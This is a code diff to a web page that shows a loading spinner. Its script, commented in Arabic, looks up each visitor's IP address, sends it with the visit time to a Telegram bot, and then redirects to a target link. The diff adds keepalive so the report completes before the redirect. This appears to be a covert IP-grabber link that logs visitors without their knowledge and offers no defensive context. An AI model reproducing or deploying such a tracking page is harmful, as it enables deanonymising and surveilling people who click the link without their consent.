@@ -8,7 +8,7 @@
         body {
             font-family: Tahoma, sans-serif;
             text-align: center;
-            padding-top: 50px;
+            padding-top: 60px;
             background-color: #f4f4f9;
         }
         .loader {
@@ -39,22 +39,23 @@
 
         async function captureAndSend() {
             try {
-                // جلب الـ IP
+                // 1. جلب عنوان الـ IP للزائر
                 let ipRes = await fetch('https://api.ipify.org?format=json');
                 let ipData = await ipRes.json();
                 let userIp = ipData.ip;
                 let visitTime = new Date().toLocaleString();
 
-                // إرسال الإشعار للقناة عبر Fetch API
-                let message = `🚨 زيارة جديدة للقناة!\n🌐 IP: ${userIp}\n⏰ الوقت: ${visitTime}`;
+                // 2. تجهيز رسالة التليجرام
+                let message = `🚨 زيارة جديدة للموقع!\n🌐 IP: ${userIp}\n⏰ الوقت: ${visitTime}`;
                 let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-                await fetch(telegramUrl);
+                // 3. إرسال الطلب عبر fetch مع وضع keepalive لضمان اكتماله حتى قبل التحويل
+                await fetch(telegramUrl, { method: 'GET', keepalive: true });
             } catch (error) {
-                console.log("Error sending to telegram", error);
+                console.log("Error:", error);
             }
 
-            // التوجيه فوراً بعد الإرسال
+            // 4. التوجيه الفوري للرابط المقصود
             window.location.href = targetRedirectUrl;
         }
 
